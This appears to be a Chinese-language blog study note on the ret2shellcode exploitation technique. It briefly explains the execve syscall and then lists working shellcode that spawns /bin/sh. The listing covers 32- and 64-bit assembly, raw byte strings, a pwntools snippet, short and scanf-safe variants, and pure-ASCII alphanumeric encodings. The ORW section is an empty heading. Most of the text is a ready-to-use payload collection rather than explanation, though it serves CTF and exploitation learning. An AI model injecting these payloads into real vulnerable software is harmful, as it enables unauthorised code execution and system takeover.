---
title: Ret2 ShellCode
date: 2024-12-14T19:57:26+08:00
lastmod: 2025-03-29T21:18:45+08:00
---

# Ret2 ShellCode

# ShellCode

> Source Code 经过 Compiler 后会成为一套Machine Code<sup>(一系列OPCode的组合)</sup>，汇编语言与Machine Code是一一对应的。
>
> 我们构建ShellCode时实际是在写汇编语言，后转换为机器码。
>
> 我们ShellCode一般有两种，一种是获取Shell，一种是通过orw绕过部分沙箱实现目的
>
> - ==execve==
> - int execve( const char *pathname, char *const argv[], char *const envp[] )
> - Spawn a shell
>
>   - execve( "/bin/sh\", NULL, NULL )
> - rax = execve_syscall_number<sup>(x86 0x0b x64 0x3b)</sup>
> - rdi = address of "/bin/sh\"
> - rsi = 0x0
> - rdx = 0x0

# GetShell

## **32位ShellCode**

```x86asm
push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
```

**shellcode = b&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;**

## **64位shellcode**

```x86asm
xor     rsi,    rsi      
push    rsi          
mov     rdi,    0x68732f2f6e69622f   
push    rdi
push    rsp  
pop    rdi          
mov     al,    59      
cdq              
syscall


```

**shellcode = b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;**

**shellcode = b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;**

```python
# 0x16字节
shellcode = asm('''
    mov rbx, 0x0068732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi,esi
    xor edx,edx
    push 59
    pop rax
    syscall
''')
```

# 可见字符 ShellCode

‍

## 32位 短字节shellcode --> 21字节

\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

## 32位 纯ascii字符shellcode

PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA

## 32位 scanf可读取的shellcode

\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh

## 64位 scanf可读取的shellcode 22字节

\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05

## 64位 较短的shellcode  23字节

\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

## 64位 纯ascii字符shellcode

Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t

‍

# ORW

‍
